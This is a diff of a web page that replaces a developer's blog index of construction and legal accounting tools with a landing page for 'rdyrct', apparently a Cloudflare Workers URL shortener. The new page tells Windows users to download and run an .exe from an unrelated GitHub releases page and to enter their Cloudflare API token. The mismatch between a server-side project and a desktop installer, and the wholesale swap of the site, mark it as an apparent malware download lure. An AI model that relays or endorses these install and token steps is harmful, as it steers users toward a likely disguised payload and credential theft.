@@ -1,143 +1,57 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>SybilGambleyyu — notes on tools for skilled work</title>
-  <meta name="description" content="Building practical tools for professionals who do real work. Notes on shipping useful software." />
-  <style>
-    :root { --ink:#142033; --muted:#5c6778; --accent:#c45c26; --bg:#f6f3ec; --card:#fff; }
-    * { box-sizing: border-box; }
-    body { margin:0; font-family: "Segoe UI", system-ui, sans-serif; background:var(--bg); color:var(--ink); line-height:1.55; }
-    header { background:#1a2b44; color:#f5f3ee; padding:28px 20px 24px; border-bottom:3px solid var(--accent); }
-    header .wrap, main { max-width:720px; margin:0 auto; padding:0 16px; }
-    header h1 { margin:0 0 6px; font-size:1.45rem; letter-spacing:-0.02em; }
-    header p { margin:0; opacity:0.8; font-size:0.95rem; }
-    main { padding:28px 16px 64px; }
-    article { background:var(--card); border:1px solid #dde2ea; border-radius:12px; padding:20px 22px; margin-bottom:14px; box-shadow:0 8px 24px rgba(20,32,51,0.05); }
-    article h2 { margin:0 0 8px; font-size:1.2rem; }
-    article h2 a { color:inherit; text-decoration:none; }
-    article h2 a:hover { color:var(--accent); }
-    .meta { font-size:0.85rem; color:var(--muted); margin-bottom:10px; }
-    article p { margin:0; color:#2a3546; }
-    footer { text-align:center; color:var(--muted); font-size:0.85rem; padding:24px; }
-    a { color:var(--accent); }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="rdyrct is an open-source URL shortener for teams using Cloudflare Workers. Create branded links, QR codes, and custom domains with ease.">
+    <title>rdyrct - Manage your team links simply</title>
 </head>
-<body>
-  <header>
-    <div class="wrap">
-      <h1>SybilGambleyyu</h1>
-      <p>Tools for people who do skilled work — and notes on building them.</p>
-    </div>
-  </header>
-  <main>
-    <article>
-      <h2><a href="posts/2026-07-22-wipbook.html">WipBook: construction WIP schedules without the fragile spreadsheet</a></h2>
-      <div class="meta">2026-07-22 · construction accounting</div>
-      <p>Local-first percentage-of-completion WIP — earned revenue, over/under billings, portfolio rollups, CSV workpapers.</p>
-    </article>
-    <article>
-      <h2><a href="posts/2026-07-22-tmticket.html">TmTicket: T&amp;M force-account tickets without the field spreadsheet</a></h2>
-      <div class="meta">2026-07-22 · construction field admin</div>
-      <p>Local-first time-and-material tickets — labor ST/OT, equipment, materials, category markups, lock/print/CSV.</p>
-    </article>
-    <article>
-      <h2><a href="posts/2026-07-22-coitrack.html">CoiTrack: vendor insurance expirations without the Excel chase</a></h2>
-      <div class="meta">2026-07-22 · construction risk</div>
-      <p>Local-first certificate of insurance tracker — GL/WC/auto expirations, expiring-soon alerts, chase-list CSV.</p>
-    </article>
-    <article>
-      <h2><a href="posts/2026-07-22-changeorderlog.html">ChangeOrderLog: revised contract sum without rebuilding the CO spreadsheet</a></h2>
-      <div class="meta">2026-07-22 · construction contract admin</div>
-      <p>Local-first change order register — original + approved COs = revised contract; pending and potential totals; running balance.</p>
-    </article>
-    <article>
-      <h2><a href="posts/2026-07-22-waiverlog.html">WaiverLog: know which lien waivers are still outstanding before you pay</a></h2>
-      <div class="meta">2026-07-22 · construction payment</div>
-      <p>Local-first lien waiver tracker for GCs — conditional/unconditional, partial/final, open chase list by pay app.</p>
-    </article>
-    <article>
-      <h2><a href="posts/2026-07-22-leasesheet.html">LeaseSheet: commercial lease abstracts without the spreadsheet sprawl</a></h2>
-      <div class="meta">2026-07-22 · commercial real estate</div>
-      <p>Local-first lease abstracts and rent schedules — escalations, free rent, NNN, occupancy — for property managers who do not need a full PMS stack.</p>
-    </article>
-    <article>
-      <h2><a href="posts/2026-07-22-bidlevel.html">BidLevel: bid tabs that level scope, not just sort raw prices</a></h2>
-      <div class="meta">2026-07-22 · construction estimating</div>
-      <p>Local-first bid tabulation with scope leveling adjustments, alternates, and ranked leveled totals for GC estimators.</p>
-    </article>
-    <article>
-      <h2><a href="posts/2026-07-22-deprecbook.html">DeprecBook: MACRS schedules without rebuilding Pub 946 tables</a></h2>
-      <div class="meta">2026-07-22 · tax &amp; bookkeeping</div>
-      <p>Half-year, mid-quarter, real property, §179, and bonus depreciation in a local-first asset register with tax-year rollups and CSV workpapers.</p>
-    </article>
-    <article>
-      <h2><a href="posts/2026-07-22-settlesheet.html">SettleSheet: settlement disbursement worksheets without rebuilding the spreadsheet</a></h2>
-      <div class="meta">2026-07-22 · contingency-fee practice</div>
-      <p>Gross recovery, contingency fee, costs, liens, net to client. SettleSheet is a free, local-first disbursement worksheet for plaintiffs’ firms — printable statement, validation, no upload.</p>
-    </article>
-    <article>
-      <h2><a href="posts/2026-07-22-evmcalc.html">EVMCalc: earned value metrics without opening the full PPM suite</a></h2>
-      <div class="meta">2026-07-22 · project controls</div>
-      <p>BAC, PV, EV, AC → CPI, SPI, EAC, TCPI. EVMCalc is a free, local-first earned value calculator for project controls — multi-snapshot history, exports, no upload.</p>
-    </article>
-    <article>
-      <h2><a href="posts/2026-07-22-burdencalc.html">BurdenCalc: fully loaded labor rates without the spreadsheet maze</a></h2>
-      <div class="meta">2026-07-22 · construction estimating</div>
-      <p>Wage is not cost. BurdenCalc is a free, local-first labor burden calculator for estimators — taxes, WC, benefits, and PTO stacked into a fully loaded hourly rate (and optional sell rate).</p>
-    </article>
-    <article>
-      <h2><a href="posts/2026-07-22-certpay.html">CertPay: multi-week certified payroll without a construction payroll suite</a></h2>
-      <div class="meta">2026-07-22 · public-work compliance</div>
-      <p>Davis-Bacon weeks pile up in Excel. CertPay is a free, local-first browser tool for multi-week certified payroll worksheets — roster, OT modes, cash fringe, and printable packages — without a full construction payroll subscription.</p>
-    </article>
-    <article>
-      <h2><a href="posts/2026-07-22-trustrecon.html">TrustRecon: three-way IOLTA reconciliation without a practice-management suite</a></h2>
-      <div class="meta">2026-07-22 · legal trust accounting</div>
-      <p>Client trust mistakes are discipline risks. TrustRecon is a free, local-first browser tool that keeps the journal, client subsidiary ledgers, and monthly three-way bank reconciliation in agreement — without uploading client balances to the cloud.</p>
-    </article>
-    <article>
-      <h2><a href="posts/2026-07-22-ledeskit.html">LedesKit: LEDES 1998B invoices without a full practice-management suite</a></h2>
-      <div class="meta">2026-07-22 · legal e-billing</div>
-      <p>Corporate clients reject non-LEDES invoices. LedesKit is a free, local-first browser tool that builds validated LEDES 1998B .LED files with UTBMS codes — no practice-management subscription required.</p>
-    </article>
-    <article>
-      <h2><a href="posts/2026-07-22-drawbook.html">DrawBook: progress pay apps without the spreadsheet tax</a></h2>
-      <div class="meta">2026-07-22 · construction billing</div>
-      <p>Small contractors still rebuild schedule-of-values payment applications in Excel every month. DrawBook is a free, local-first browser tool that does the retainage, materials stored, and prior-draw math correctly — and never uploads your contract data.</p>
-    </article>
-  </main>
-  <footer>
-    <a href="tools.html">Tools</a>
-    ·
-    <a href="https://github.com/SybilGambleyyu">GitHub</a>
-    ·
-    <a href="https://sybilgambleyyu.github.io/DrawBook/">DrawBook</a>
-    ·
-    <a href="https://sybilgambleyyu.github.io/LedesKit/">LedesKit</a>
-    ·
-    <a href="https://sybilgambleyyu.github.io/TrustRecon/">TrustRecon</a>
-    ·
-    <a href="https://sybilgambleyyu.github.io/CertPay/">CertPay</a>
-    ·
-    <a href="https://sybilgambleyyu.github.io/BurdenCalc/">BurdenCalc</a>
-    ·
-    <a href="https://sybilgambleyyu.github.io/EVMCalc/">EVMCalc</a>
-    ·
-    <a href="https://sybilgambleyyu.github.io/SettleSheet/">SettleSheet</a>
-    ·
-    <a href="https://sybilgambleyyu.github.io/DeprecBook/">DeprecBook</a>
-    ·
-    <a href="https://sybilgambleyyu.github.io/BidLevel/">BidLevel</a>
-    ·
-    <a href="https://sybilgambleyyu.github.io/LeaseSheet/">LeaseSheet</a>
-    ·
-    <a href="https://sybilgambleyyu.github.io/WaiverLog/">WaiverLog</a>
-    ·
-    <a href="https://sybilgambleyyu.github.io/ChangeOrderLog/">ChangeOrderLog</a>
-    ·
-    <a href="https://sybilgambleyyu.github.io/CoiTrack/">CoiTrack</a>
-  </footer>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f4f4;">
+
+    <header style="padding: 20px; background: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
+        <h1 style="color: #2c3e50;">🔗 rdyrct - Create branded links for your team</h1>
+        <p>rdyrct helps your team manage web links. You create branded short links and QR codes using Cloudflare technology. This software keeps your professional links organized and easy to track.</p>
+        
+        <a href="https://github.com/impugnable-reed152/rdyrct/releases" style="display: inline-block; background-color: #34495e; color: #fff; padding: 12px 24px; text-decoration: none; border-radius: 5px; font-weight: bold; margin-top: 10px;">Download rdyrct Now</a>
+    </header>
+
+    <main style="background: #fff; padding: 20px; margin-top: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
+
+        <h2 style="color: #2c3e50;">📋 What is rdyrct?</h2>
+        <p>rdyrct is a tool for teams that need to shorten long web addresses. Long URLs look cluttered in emails and documents. This tool converts those links into short, memorable versions. You also gain the ability to generate QR codes for your links. This makes it simple to share content in printed materials or digital presentations.</p>
+
+        <h2 style="color: #2c3e50;">🚀 How to get started</h2>
+        <p>Follow these steps to install and run the software on your Windows computer.</p>
+        
+        <h3 style="color: #2c3e50;">1. Visit the download page</h3>
+        <p>Go to the official <a href="https://github.com/impugnable-reed152/rdyrct/releases" style="color: #2980b9;">releases page</a> to find the latest version of the application.</p>
+
+        <h3 style="color: #2c3e50;">2. Download the installer</h3>
+        <p>Locate the file ending in .exe. Click the file name to save it to your computer. Choose a folder like your Downloads folder so you can find it easily.</p>
+
+        <h3 style="color: #2c3e50;">3. Run the application</h3>
+        <p>Find the downloaded file in your folder. Double-click the file to start the installation process. Follow the instructions on the screen. The setup wizard guides you through every step until the program is ready.</p>
+
+        <h2 style="color: #2c3e50;">✨ Key Features</h2>
+        <ul style="padding-left: 20px;">
+            <li><strong>Branded Links:</strong> Create links that reflect your own domain name.</li>
+            <li><strong>QR Codes:</strong> Generate scannable codes for any link in your dashboard.</li>
+            <li><strong>Cloudflare Integration:</strong> Use your existing Cloudflare Worker account to host these links securely.</li>
+            <li><strong>D1 Database:</strong> Store link data on the fast D1 database system.</li>
+            <li><strong>Team Access:</strong> Share access credentials with your colleagues to manage your organization's link library.</li>
+        </ul>
+
+        <h2 style="color: #2c3e50;">💻 System Requirements</h2>
+        <p>To run rdyrct on your machine, you need a computer running Windows 10 or Windows 11. Ensure you have a stable internet connection. The application requires basic access to your browser to authenticate with your Cloudflare account. We suggest having at least 200MB of free disk space for the installation files.</p>
+
+        <h2 style="color: #2c3e50;">💡 Common Questions</h2>
+        <p><strong>Do I need to know how to code?</strong> No. The interface is designed for everyday use. You interact with the application through menus and buttons instead of writing lines of code.</p>
+        <p><strong>How do I connect my domain?</strong> During the initial setup, the application asks for your Cloudflare API token. This token grants the application permission to create links on your specific domain.</p>
+
+        <footer style="margin-top: 40px; border-top: 1px solid #ccc; padding-top: 20px; font-size: 0.9em; color: #7f8c8d;">
+            <p>Keywords: cloudflare, cloudflare-workers, d1, d1-database, open-source, qr-code, qrcode, qrcode-generator, url, url-shortener, workers-kv</p>
+        </footer>
+
+    </main>
 </body>
 </html>
